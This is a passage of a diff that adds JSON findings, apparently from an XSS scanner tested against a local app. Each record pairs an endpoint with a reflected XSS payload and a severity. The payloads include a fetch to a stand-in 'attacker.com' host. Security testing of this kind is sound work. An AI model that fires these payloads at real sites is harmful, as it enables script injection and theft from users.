+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<isindex action=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<form><button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<table background='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<div onpointerover=alert(1)>MOVE</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<div onmouseenter=alert(1)>TEST</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<div onclick=alert(1)>CLICK</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img dynsrc='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img lowsrc='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<base href='javascript:alert(1);//'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<style>@import'javascript:alert(1)';</style>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<link rel=stylesheet href=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<xml><script>alert(1)</script></xml>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>confirm(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>prompt(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "javascript:alert(1)",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "';alert(1);//",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "\";alert(1);//",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img src=x onerror=confirm(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg/onload=confirm(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>console.log(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>fetch('http://attacker.com')</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<video onloadstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<audio onloadstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img src=x onerror=prompt(document.domain)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg><set onbegin=alert(1) attributeName=x></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<textarea onfocus=alert(1) autofocus></textarea>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<select onfocus=alert(1) autofocus></select>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<body onpageshow=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img src=x onerror=eval('alert(1)')>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>setTimeout(alert,1000,1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>setInterval(alert,1000,1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>alert('XSS')</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=x onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=1 onerror=alert(document.domain)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg><script>alert(1)</script></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<body onload=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "'><script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<input autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<textarea autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<select autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<keygen autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<math href='javascript:alert(1)'>CLICK</math>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg><animate onbegin=alert(1) attributeName=x></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=# onmouseover=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<a href=javascript:alert(1)>CLICK</a>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<isindex action=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<form><button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<table background='javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<div onpointerover=alert(1)>MOVE</div>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<div onmouseenter=alert(1)>TEST</div>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<div onclick=alert(1)>CLICK</div>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img dynsrc='javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img lowsrc='javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<base href='javascript:alert(1);//'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<style>@import'javascript:alert(1)';</style>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<link rel=stylesheet href=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<xml><script>alert(1)</script></xml>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>confirm(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>prompt(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "javascript:alert(1)",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "';alert(1);//",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "\";alert(1);//",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=x onerror=confirm(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg/onload=confirm(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>console.log(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>fetch('http://attacker.com')</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<video onloadstart=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<audio onloadstart=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=x onerror=prompt(document.domain)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg><set onbegin=alert(1) attributeName=x></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<textarea onfocus=alert(1) autofocus></textarea>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<select onfocus=alert(1) autofocus></select>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<body onpageshow=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=x onerror=eval('alert(1)')>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>setTimeout(alert,1000,1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>setInterval(alert,1000,1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>alert('XSS')</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=x onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=1 onerror=alert(document.domain)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg><script>alert(1)</script></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<body onload=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "'><script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<input autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<textarea autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<select autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<keygen autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<math href='javascript:alert(1)'>CLICK</math>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg><animate onbegin=alert(1) attributeName=x></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=# onmouseover=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<a href=javascript:alert(1)>CLICK</a>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<isindex action=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<form><button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<table background='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<div onpointerover=alert(1)>MOVE</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<div onmouseenter=alert(1)>TEST</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<div onclick=alert(1)>CLICK</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img dynsrc='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img lowsrc='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<base href='javascript:alert(1);//'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<style>@import'javascript:alert(1)';</style>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
